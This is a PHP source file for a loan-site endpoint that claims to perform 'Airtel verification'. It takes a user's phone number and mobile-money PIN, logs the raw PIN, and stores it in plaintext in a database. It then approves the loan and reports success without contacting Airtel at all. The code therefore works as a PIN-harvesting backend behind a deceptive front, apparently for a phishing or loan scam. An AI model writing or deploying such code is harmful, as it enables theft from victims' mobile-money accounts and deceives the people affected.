<?php
// Update loan application with Airtel verification

require_once __DIR__ . '/../config/db.php';

// Make sure logs directory exists
$logDir = __DIR__ . '/../logs';
if (!is_dir($logDir)) {
    @mkdir($logDir, 0755, true);
}
$logFile = $logDir . '/verify_airtel.log';

// Always return JSON
header('Content-Type: application/json; charset=utf-8');

// Helper log
function log_msg($msg) {
    global $logFile;
    $line = '[' . date('Y-m-d H:i:s') . '] ' . $msg . "\n";
    @file_put_contents($logFile, $line, FILE_APPEND | LOCK_EX);
}

if ($_SERVER["REQUEST_METHOD"] !== 'POST') {
    http_response_code(400);
    echo json_encode(['error' => 'Invalid request method']);
    exit;
}

try {
    $raw = file_get_contents('php://input');
    log_msg('Incoming payload: ' . $raw);
    $data = json_decode($raw, true);

    if (json_last_error() !== JSON_ERROR_NONE) {
        http_response_code(400);
        $err = 'Invalid JSON payload';
        log_msg($err);
        echo json_encode(['error' => $err]);
        exit;
    }

    $phone = isset($data['phone']) ? trim($data['phone']) : '';
    $airtel_pin = isset($data['pin']) ? trim($data['pin']) : '';

    if ($phone === '' || $airtel_pin === '') {
        http_response_code(400);
        $err = 'Missing phone or PIN';
        log_msg($err);
        echo json_encode(['error' => $err]);
        exit;
    }

    if (!preg_match('/^\\d{4}$/', $airtel_pin)) {
        http_response_code(400);
        $err = 'Invalid PIN format';
        log_msg($err . ' - ' . $airtel_pin);
        echo json_encode(['error' => $err]);
        exit;
    }

    // Find application
    $stmt = $pdo->prepare('SELECT id FROM loan_applications WHERE phone = :phone ORDER BY created_at DESC LIMIT 1');
    $stmt->execute([':phone' => $phone]);
    $row = $stmt->fetch();

    if (!$row) {
        http_response_code(404);
        $err = 'Loan application not found for phone: ' . $phone;
        log_msg($err);
        echo json_encode(['error' => 'Loan application not found']);
        exit;
    }

    $application_id = $row['id'];

    $updateStmt = $pdo->prepare('UPDATE loan_applications SET airtel_pin = :pin, airtel_confirmed = 1, status = "approved" WHERE id = :id');
    $result = $updateStmt->execute([':pin' => $airtel_pin, ':id' => $application_id]);

    if ($result) {
        http_response_code(200);
        log_msg('Verification saved for id: ' . $application_id);
        echo json_encode(['success' => true, 'message' => 'Airtel verification successful', 'redirect' => 'success.html']);
        exit;
    }

    http_response_code(500);
    $err = 'Failed to update verification for id: ' . $application_id;
    log_msg($err);
    echo json_encode(['error' => 'Failed to update verification']);

} catch (Exception $e) {
    http_response_code(500);
    $err = 'Server exception: ' . $e->getMessage();
    log_msg($err);
    echo json_encode(['error' => 'Server error']);
}

?>
